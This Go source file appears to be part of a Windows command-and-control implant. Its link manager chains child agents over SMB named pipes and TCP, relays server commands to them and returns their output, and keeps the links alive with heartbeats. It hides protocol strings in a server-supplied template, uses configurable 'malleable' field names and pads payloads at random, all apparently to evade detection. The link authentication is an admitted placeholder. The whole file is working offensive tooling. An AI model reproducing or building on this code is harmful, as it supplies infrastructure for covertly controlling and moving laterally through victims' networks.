//go:build windows
// +build windows

package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"sync"
	"sync/atomic"
	"time"
)

// Template indices for link manager strings (must match server's common.go)
// Note: idxLinkProtoSmb and idxLinkProtoTcp are defined in action_link.go
const (
	idxLinkKeyType      = 133
	idxLinkKeyPayload   = 134
	idxLinkMsgData      = 135
	idxLinkMsgDisconn   = 136
	idxLinkMsgHandshake = 137
	idxLinkMsgPing      = 138
	idxLinkMsgPong      = 139
	idxLinkStatusActive = 340
	idxLinkStatusInact  = 341
	idxLinkAuthPrefix   = 342
	idxLinkAuthOK       = 343
	idxLinkFmtList      = 344
	idxLinkFmtRow       = 345
	idxLinkTimeFmt      = 346
	// SMB pipe strings for link_pipe_windows.go
	idxLinkLocalWord = 683
	idxLinkPipeWord  = 682
)

// linkManagerTemplate stores the template received from the server
var linkManagerTemplate []string
var linkManagerTemplateMu sync.RWMutex

// SetLinkManagerTemplate stores the template for link manager use
func SetLinkManagerTemplate(templates []string) {
	linkManagerTemplateMu.Lock()
	defer linkManagerTemplateMu.Unlock()
	linkManagerTemplate = templates
}

// lmTpl retrieves a template string by index
// Template must be set via SetLinkManagerTemplate before link operations
func lmTpl(idx int) string {
	linkManagerTemplateMu.RLock()
	tpl := linkManagerTemplate
	linkManagerTemplateMu.RUnlock()

	if tpl != nil && idx < len(tpl) {
		return tpl[idx]
	}
	return ""
}

// Convenience functions that call lmTpl (for cleaner code)
func lmKeyType() string       { return lmTpl(idxLinkKeyType) }
func lmKeyPayload() string    { return lmTpl(idxLinkKeyPayload) }
func lmTypeData() string      { return lmTpl(idxLinkMsgData) }
func lmTypeDisconn() string   { return lmTpl(idxLinkMsgDisconn) }
func lmTypeHandshake() string { return lmTpl(idxLinkMsgHandshake) }
func lmTypePing() string      { return lmTpl(idxLinkMsgPing) }
func lmTypePong() string      { return lmTpl(idxLinkMsgPong) }
func lmStatusActive() string  { return lmTpl(idxLinkStatusActive) }
func lmStatusInact() string   { return lmTpl(idxLinkStatusInact) }
func lmAuthPrefix() string    { return lmTpl(idxLinkAuthPrefix) }
func lmAuthOK() string        { return lmTpl(idxLinkAuthOK) }
func lmFmtLinks() string      { return lmTpl(idxLinkFmtList) }
func lmFmtLinkRow() string    { return lmTpl(idxLinkFmtRow) }
func lmTimeFmt() string       { return lmTpl(idxLinkTimeFmt) }

// Heartbeat configuration
const (
	heartbeatInterval = 60 * time.Second // Send ping every 60 seconds
)

// RPeer represents a connected SMB or TCP agent
type RPeer struct {
	RID         string    // Short routing ID (assigned by this agent)
	PipePath          string    // Full pipe path for SMB (\\server\pipe\name)
	Address           string    // TCP address for TCP links (host:port)
	LinkType          string    // "smb" or "tcp"
	Conn              net.Conn  // Active connection (pipe or TCP)
	Connected         time.Time // When the link was established
	LastSeen          time.Time // Last successful communication
	IsActive          bool      // Whether the link is active
	Pending bool      // True after auth, false after first message (for state-based routing)
	prependLen        int       // Prepend length for transform reversal (set by last command)
	appendLen         int       // Append length for transform reversal (set by last command)
	mu                sync.Mutex
}

// RMgr manages connections to linked SMB and TCP agents
type RMgr struct {
	mu             sync.RWMutex
	links          map[string]*RPeer // routingID -> RPeer
	pipeToRoute    map[string]string       // pipePath -> routingID (for SMB dedup)
	addressToRoute map[string]string       // address -> routingID (for TCP dedup)
	nextID         uint32                  // Atomic counter for generating routing IDs
	outboundData   chan *ROut       // Data received from linked agents, to be sent to server
	handshakeData  chan *ROut       // Handshake data from new linked agents (sent via "lh" field)

	// Response channels for synchronous command/response patterns
	responseChannels map[string]chan *ROut // routingID -> response channel
	responseMu       sync.RWMutex

	// unlink notifications to be sent to server
	unlinkNotifications chan string // Routing IDs that have been unlinked
}

// ROut represents data from a linked agent to be forwarded to the server
type ROut struct {
	RID     string `json:"r"`             // Routing ID
	Payload       string `json:"p"`             // Base64 encoded payload (or transformed blob)
	PrependLength int    `json:"pre,omitempty"` // Length of random prepend (for transform reversal)
	AppendLength  int    `json:"app,omitempty"` // Length of random append (for transform reversal)
}

// RIn represents data from the server destined for a linked agent
type RIn struct {
	RID     string `json:"r"`             // Routing ID
	Payload       string `json:"p"`             // Base64 encoded payload (or transformed blob)
	PrependLength int    `json:"pre,omitempty"` // Length of random prepend (for transform reversal)
	AppendLength  int    `json:"app,omitempty"` // Length of random append (for transform reversal)
}

// toMalleableMap converts ROut to a map using configurable field names
// This avoids hardcoded JSON struct tags when marshaling
func (ld *ROut) toMalleableMap() map[string]interface{} {
	m := map[string]interface{}{
		MALLEABLE_ROUTING_ID_FIELD: ld.RID,
		MALLEABLE_PAYLOAD_FIELD:    ld.Payload,
	}
	if ld.PrependLength > 0 {
		m["pre"] = ld.PrependLength
	}
	if ld.AppendLength > 0 {
		m["app"] = ld.AppendLength
	}
	return m
}

// ConvertLinkDataToMaps converts a slice of ROut to maps with malleable field names
func ConvertLinkDataToMaps(data []*ROut) []map[string]interface{} {
	if data == nil {
		return nil
	}
	result := make([]map[string]interface{}, len(data))
	for i, ld := range data {
		result[i] = ld.toMalleableMap()
	}
	return result
}

var (
	linkManager     *RMgr
	linkManagerOnce sync.Once
)

// getLinkManager returns the singleton link manager
func getLinkManager() *RMgr {
	linkManagerOnce.Do(func() {
		linkManager = &RMgr{
			links:               make(map[string]*RPeer),
			pipeToRoute:         make(map[string]string),
			addressToRoute:      make(map[string]string),
			outboundData:        make(chan *ROut, 1000),
			handshakeData:       make(chan *ROut, 50),
			responseChannels:    make(map[string]chan *ROut),
			unlinkNotifications: make(chan string, 100),
		}
		// Start the heartbeat goroutine to keep links alive
		linkManager.startHeartbeat()
	})
	return linkManager
}

// generateRoutingID creates a short, unique routing ID
func (lm *RMgr) generateRoutingID() string {
	id := atomic.AddUint32(&lm.nextID, 1)
	return fmt.Sprintf("%x", id)
}

// link establishes a connection to an SMB agent via named pipe
func (lm *RMgr) link(pipePath string) (string, error) {
	lm.mu.Lock()
	defer lm.mu.Unlock()

	// Check if already linked to this pipe
	if existingRoute, exists := lm.pipeToRoute[pipePath]; exists {
		if link, ok := lm.links[existingRoute]; ok && link.IsActive {
			return "", fmt.Errorf("%s", Err(E5))
		}
	}

	// Connect to the named pipe
	conn, err := connectToPipe(pipePath)
	if err != nil {
		return "", fmt.Errorf("%s", ErrCtx(E12, err.Error()))
	}

	// Perform lightweight authentication with the SMB agent
	if err := performLinkAuth(conn); err != nil {
		conn.Close()
		return "", fmt.Errorf("%s", ErrCtx(E3, err.Error()))
	}

	// Generate routing ID
	routingID := lm.generateRoutingID()

	// Create linked agent entry
	link := &RPeer{
		RID:         routingID,
		PipePath:          pipePath,
		LinkType:          lmTpl(idxLinkProtoSmb),
		Conn:              conn,
		Connected:         time.Now(),
		LastSeen:          time.Now(),
		IsActive:          true,
		Pending: true, // First message after auth is always handshake
	}

	// Store the link
	lm.links[routingID] = link
	lm.pipeToRoute[pipePath] = routingID

	// Start goroutine to handle incoming data from the SMB agent
	go lm.handleIncomingData(link)

	return routingID, nil
}

// linkTCP establishes a connection to a TCP agent
func (lm *RMgr) linkTCP(address string) (string, error) {
	lm.mu.Lock()
	defer lm.mu.Unlock()

	// Check if already linked to this address
	if existingRoute, exists := lm.addressToRoute[address]; exists {
		if link, ok := lm.links[existingRoute]; ok && link.IsActive {
			return "", fmt.Errorf("%s", Err(E5))
		}
	}

	// Connect via TCP
	conn, err := dialTCP(address, 30*time.Second)
	if err != nil {
		return "", fmt.Errorf("%s", ErrCtx(E12, err.Error()))
	}

	// Perform HMAC-based authentication with the TCP agent
	if err := performLinkAuthTCP(conn); err != nil {
		conn.Close()
		return "", fmt.Errorf("%s", ErrCtx(E3, err.Error()))
	}

	// Generate routing ID
	routingID := lm.generateRoutingID()

	// Create linked agent entry
	link := &RPeer{
		RID:         routingID,
		Address:           address,
		LinkType:          lmTpl(idxLinkProtoTcp),
		Conn:              conn,
		Connected:         time.Now(),
		LastSeen:          time.Now(),
		IsActive:          true,
		Pending: true, // First message after auth is always handshake
	}

	// Store the link
	lm.links[routingID] = link
	lm.addressToRoute[address] = routingID

	// Start goroutine to handle incoming data from the TCP agent
	go lm.handleIncomingData(link)

	return routingID, nil
}

// unlink disconnects from an SMB or TCP agent
func (lm *RMgr) unlink(routingID string) error {
	lm.mu.Lock()
	defer lm.mu.Unlock()

	link, exists := lm.links[routingID]
	if !exists {
		return fmt.Errorf("%s", Err(E4))
	}

	// Send graceful disconnect message
	if link.IsActive && link.Conn != nil {
		sendDisconnectMessage(link.Conn)
	}

	// Close the connection
	if link.Conn != nil {
		link.Conn.Close()
	}

	link.IsActive = false

	// Queue unlink notification to be sent to server
	select {
	case lm.unlinkNotifications <- routingID:
	default:
	}

	// Remove from maps based on link type
	if link.LinkType == lmTpl(idxLinkProtoTcp) {
		delete(lm.addressToRoute, link.Address)
	} else {
		delete(lm.pipeToRoute, link.PipePath)
	}
	delete(lm.links, routingID)

	return nil
}

// getLink returns a linked agent by routing ID
func (lm *RMgr) getLink(routingID string) (*RPeer, bool) {
	lm.mu.RLock()
	defer lm.mu.RUnlock()

	link, exists := lm.links[routingID]
	if !exists || !link.IsActive {
		return nil, false
	}
	return link, true
}

// getActiveLinks returns all active linked agents
func (lm *RMgr) getActiveLinks() []*RPeer {
	lm.mu.RLock()
	defer lm.mu.RUnlock()

	var active []*RPeer
	for _, link := range lm.links {
		if link.IsActive {
			active = append(active, link)
		}
	}
	return active
}

// forwardToLinkedAgent sends data from the server to a linked agent
// This is the legacy version that wraps in JSON envelope
func (lm *RMgr) forwardToLinkedAgent(routingID string, payload string) error {
	link, exists := lm.getLink(routingID)
	if !exists {
		return fmt.Errorf("%s", Err(E4))
	}

	link.mu.Lock()
	defer link.mu.Unlock()

	if link.Conn == nil || !link.IsActive {
		return fmt.Errorf("%s", Err(E4))
	}

	// Send the payload over the pipe (legacy JSON envelope format)
	message := map[string]string{}
	message[lmKeyType()] = lmTypeData()
	message[lmKeyPayload()] = payload

	data, err := json.Marshal(message)
	if err != nil {
		return fmt.Errorf("%s", ErrCtx(E18, err.Error()))
	}

	// Write length-prefixed message
	if err := writeMessage(link.Conn, data); err != nil {
		link.IsActive = false
		return fmt.Errorf("%s", ErrCtx(E11, err.Error()))
	}

	link.LastSeen = time.Now()
	return nil
}

// forwardToLinkedAgentRaw sends pre-transformed data to a linked agent
// Used when transforms are applied by the server - parent just relays raw bytes
func (lm *RMgr) forwardToLinkedAgentRaw(routingID string, payload string, prependLen, appendLen int) error {
	link, exists := lm.getLink(routingID)
	if !exists {
		return fmt.Errorf("%s", Err(E4))
	}

	link.mu.Lock()
	defer link.mu.Unlock()

	if link.Conn == nil || !link.IsActive {
		return fmt.Errorf("%s", Err(E4))
	}

	// Decode base64 payload - server sent pre-transformed blob
	rawData, err := base64.StdEncoding.DecodeString(payload)
	if err != nil {
		return fmt.Errorf("%s", ErrCtx(E18, err.Error()))
	}

	// Write raw bytes directly to pipe (no JSON envelope)
	if err := writeMessage(link.Conn, rawData); err != nil {
		link.IsActive = false
		return fmt.Errorf("%s", ErrCtx(E11, err.Error()))
	}

	// Store padding lengths for this link (needed when reading response)
	link.prependLen = prependLen
	link.appendLen = appendLen

	link.LastSeen = time.Now()
	return nil
}

// forwardToLinkedAgentAndWait sends data to a linked agent and waits for a response
// Returns the response payload or error if timeout occurs
func (lm *RMgr) forwardToLinkedAgentAndWait(routingID string, payload string, timeout time.Duration) (*ROut, error) {
	// Create a response channel for this routing ID
	respChan := make(chan *ROut, 1)

	lm.responseMu.Lock()
	lm.responseChannels[routingID] = respChan
	lm.responseMu.Unlock()

	// Clean up when done
	defer func() {
		lm.responseMu.Lock()
		delete(lm.responseChannels, routingID)
		lm.responseMu.Unlock()
	}()

	// Forward the command
	if err := lm.forwardToLinkedAgent(routingID, payload); err != nil {
		return nil, err
	}

	// Wait for response with timeout
	select {
	case response := <-respChan:
		return response, nil
	case <-time.After(timeout):
		return nil, nil // Timeout is not an error - response will come later via normal queue
	}
}

// forwardToLinkedAgentRawAndWait sends raw transformed data to a linked agent and waits for a response
// Used when transforms are applied by the server - parent just relays raw bytes
func (lm *RMgr) forwardToLinkedAgentRawAndWait(routingID string, payload string, prependLen, appendLen int, timeout time.Duration) (*ROut, error) {
	// Create a response channel for this routing ID
	respChan := make(chan *ROut, 1)

	lm.responseMu.Lock()
	lm.responseChannels[routingID] = respChan
	lm.responseMu.Unlock()

	// Clean up when done
	defer func() {
		lm.responseMu.Lock()
		delete(lm.responseChannels, routingID)
		lm.responseMu.Unlock()
	}()

	// Forward the command using raw mode
	if err := lm.forwardToLinkedAgentRaw(routingID, payload, prependLen, appendLen); err != nil {
		return nil, err
	}

	// Wait for response with timeout
	select {
	case response := <-respChan:
		return response, nil
	case <-time.After(timeout):
		return nil, nil // Timeout is not an error - response will come later via normal queue
	}
}

// waitForLinkData waits for data from a specific routing ID with timeout
// Used after posting to server to wait for handshake response
func (lm *RMgr) waitForLinkData(routingID string, timeout time.Duration) (*ROut, error) {
	// Create a response channel for this routing ID
	respChan := make(chan *ROut, 1)

	lm.responseMu.Lock()
	lm.responseChannels[routingID] = respChan
	lm.responseMu.Unlock()

	// Clean up when done
	defer func() {
		lm.responseMu.Lock()
		delete(lm.responseChannels, routingID)
		lm.responseMu.Unlock()
	}()

	// Wait for response with timeout
	select {
	case response := <-respChan:
		return response, nil
	case <-time.After(timeout):
		return nil, fmt.Errorf("%s", Err(E9))
	}
}

// getOutboundData returns data that needs to be sent to the server
func (lm *RMgr) getOutboundData() []*ROut {
	var data []*ROut

	// Drain the channel (non-blocking)
	for {
		select {
		case item := <-lm.outboundData:
			data = append(data, item)
		default:
			return data
		}
	}
}

// getHandshakeData returns a single handshake to send to the server (via "lh" field)
// Returns nil if no handshake is pending
func (lm *RMgr) getHandshakeData() *ROut {
	select {
	case handshake := <-lm.handshakeData:
		return handshake
	default:
		return nil
	}
}

// getUnlinkNotifications returns routing IDs that have been unlinked and need to be reported to the server
func (lm *RMgr) getUnlinkNotifications() []string {
	var notifications []string

	// Drain the channel (non-blocking)
	for {
		select {
		case routingID := <-lm.unlinkNotifications:
			notifications = append(notifications, routingID)
		default:
			if len(notifications) > 0 {
			}
			return notifications
		}
	}
}

func (lm *RMgr) handleIncomingData(link *RPeer) {
	defer func() {
		link.mu.Lock()
		link.IsActive = false
		link.mu.Unlock()
	}()

	for {
		// Read length-prefixed message from pipe
		data, err := readMessage(link.Conn)
		if err != nil {
			return
		}

		// Try to parse as legacy JSON format first
		var message map[string]string
		if err := json.Unmarshal(data, &message); err == nil && message[lmKeyType()] != "" {
			// Successfully parsed as JSON with type field - legacy format
			switch message[lmKeyType()] {
			case lmTypeData():
				// Build outbound data
				outbound := &ROut{
					RID: link.RID,
					Payload:   message[lmKeyPayload()],
				}
				lm.deliverOutbound(link, outbound)

			case lmTypeHandshake():
				// Initial handshake from SMB/TCP agent - queue for server via "lh" field
				outbound := &ROut{
					RID: link.RID,
					Payload:   message[lmKeyPayload()],
				}
				select {
				case lm.handshakeData <- outbound:
				default:
				}

				// Clear handshake state after receiving JSON handshake
				link.mu.Lock()
				link.Pending = false
				link.mu.Unlock()

			case lmTypePong():
				// Heartbeat response from child agent - just update LastSeen

			case lmTypeDisconn():
				return
			}
		} else {
			// Not valid JSON or no type field - treat as raw transformed data
			// Child agent sent pre-transformed blob, base64 encode and forward
			link.mu.Lock()
			isHandshake := link.Pending
			prependLen := link.prependLen
			appendLen := link.appendLen
			link.Pending = false // First message consumed
			link.mu.Unlock()

			outbound := &ROut{
				RID:     link.RID,
				Payload:       base64.StdEncoding.EncodeToString(data),
				PrependLength: prependLen,
				AppendLength:  appendLen,
			}

			if isHandshake {
				// First message after auth = handshake (for TCP agents that send opaque handshakes)
				select {
				case lm.handshakeData <- outbound:
				default:
				}
			} else {
				// Subsequent messages = data
				lm.deliverOutbound(link, outbound)
			}
		}

		link.mu.Lock()
		link.LastSeen = time.Now()
		link.mu.Unlock()
	}
}

// deliverOutbound delivers data to synchronous waiter or queues for async processing
func (lm *RMgr) deliverOutbound(link *RPeer, outbound *ROut) {
	// Check if someone is waiting synchronously for this response
	lm.responseMu.RLock()
	respChan, hasSyncWaiter := lm.responseChannels[link.RID]
	lm.responseMu.RUnlock()

	if hasSyncWaiter {
		// Send to synchronous waiter (non-blocking)
		select {
		case respChan <- outbound:
		default:
			// Channel full or closed, fall back to async queue
			lm.queueOutboundData(outbound)
		}
	} else {
		// No synchronous waiter, queue for normal async processing
		lm.queueOutboundData(outbound)
	}
}

// queueOutboundData is a helper to queue data for async server delivery
func (lm *RMgr) queueOutboundData(outbound *ROut) {
	select {
	case lm.outboundData <- outbound:
	default:
	}
}

// queueHandshakeData is a helper to queue handshake data for async delivery to server via "lh" field
func (lm *RMgr) queueHandshakeData(data *ROut) {
	select {
	case lm.handshakeData <- data:
	default:
	}
}

// listLinks returns a summary of all linked agents
func (lm *RMgr) listLinks() string {
	lm.mu.RLock()
	defer lm.mu.RUnlock()

	if len(lm.links) == 0 {
		return Succ(S0)
	}

	result := fmt.Sprintf(lmFmtLinks(), len(lm.links))
	for routingID, link := range lm.links {
		status := lmStatusActive()
		if !link.IsActive {
			status = lmStatusInact()
		}
		result += fmt.Sprintf(lmFmtLinkRow(),
			routingID, link.PipePath, status,
			link.Connected.Format(lmTimeFmt()),
			link.LastSeen.Format(lmTimeFmt()))
	}
	return result
}

// Helper functions for pipe communication

func connectToPipe(pipePath string) (net.Conn, error) {
	// Use DialTimeout for Windows named pipes
	timeout := 30 * time.Second
	deadline := time.Now().Add(timeout)

	for time.Now().Before(deadline) {
		conn, err := dialPipe(pipePath)
		if err == nil {
			return conn, nil
		}
		time.Sleep(100 * time.Millisecond)
	}

	return nil, fmt.Errorf("%s", Err(E9))
}

func performLinkAuth(conn net.Conn) error {
	// Lightweight authentication:
	// 1. Read challenge from SMB agent
	// 2. Sign with our key
	// 3. Send response

	// Set deadline for auth
	conn.SetDeadline(time.Now().Add(10 * time.Second))
	defer conn.SetDeadline(time.Time{}) // Clear deadline

	// Read challenge
	challenge, err := readMessage(conn)
	if err != nil {
		return fmt.Errorf("%s", ErrCtx(E10, err.Error()))
	}

	// Simple challenge-response for now
	// In production, use proper crypto
	response := append([]byte(lmAuthPrefix()), challenge...)

	if err := writeMessage(conn, response); err != nil {
		return fmt.Errorf("%s", ErrCtx(E11, err.Error()))
	}

	// Read confirmation
	confirm, err := readMessage(conn)
	if err != nil {
		return fmt.Errorf("%s", ErrCtx(E10, err.Error()))
	}

	if string(confirm) != lmAuthOK() {
		return fmt.Errorf("%s", Err(E3))
	}

	return nil
}

func sendDisconnectMessage(conn net.Conn) {
	message := map[string]string{}
	message[lmKeyType()] = lmTypeDisconn()
	data, _ := json.Marshal(message)
	conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
	writeMessage(conn, data)
}

func writeMessage(conn net.Conn, data []byte) error {
	// Length-prefixed message: 4-byte length + data
	length := uint32(len(data))
	header := []byte{
		byte(length),
		byte(length >> 8),
		byte(length >> 16),
		byte(length >> 24),
	}

	if _, err := conn.Write(header); err != nil {
		return err
	}
	_, err := conn.Write(data)
	return err
}

func readMessage(conn net.Conn) ([]byte, error) {
	// Read 4-byte length header
	header := make([]byte, 4)
	if _, err := io.ReadFull(conn, header); err != nil {
		return nil, err
	}

	length := uint32(header[0]) | uint32(header[1])<<8 | uint32(header[2])<<16 | uint32(header[3])<<24

	// Sanity check
	if length > 10*1024*1024 { // 10MB max
		return nil, fmt.Errorf("%s", Err(E2))
	}

	// Read data
	data := make([]byte, length)
	totalRead := 0
	for totalRead < int(length) {
		n, err := conn.Read(data[totalRead:])
		if err != nil {
			return nil, err
		}
		totalRead += n
	}

	return data, nil
}

// startHeartbeat starts the heartbeat goroutine that pings all active links periodically
func (lm *RMgr) startHeartbeat() {
	go func() {
		ticker := time.NewTicker(heartbeatInterval)
		defer ticker.Stop()

		for range ticker.C {
			lm.pingAllLinks()
		}
	}()
}

// pingAllLinks sends a ping message to all active linked agents
func (lm *RMgr) pingAllLinks() {
	lm.mu.RLock()
	links := make([]*RPeer, 0, len(lm.links))
	for _, link := range lm.links {
		if link.IsActive {
			links = append(links, link)
		}
	}
	lm.mu.RUnlock()

	for _, link := range links {
		lm.sendPing(link)
	}
}

// sendPing sends a ping message to a specific linked agent
func (lm *RMgr) sendPing(link *RPeer) error {
	link.mu.Lock()
	defer link.mu.Unlock()

	if link.Conn == nil || !link.IsActive {
		return fmt.Errorf("%s", Err(E4))
	}

	message := map[string]string{}
	message[lmKeyType()] = lmTypePing()

	data, err := json.Marshal(message)
	if err != nil {
		return err
	}

	// Set a short write deadline for ping
	link.Conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	defer link.Conn.SetWriteDeadline(time.Time{})

	if err := writeMessage(link.Conn, data); err != nil {
		link.IsActive = false
		return err
	}

	return nil
}
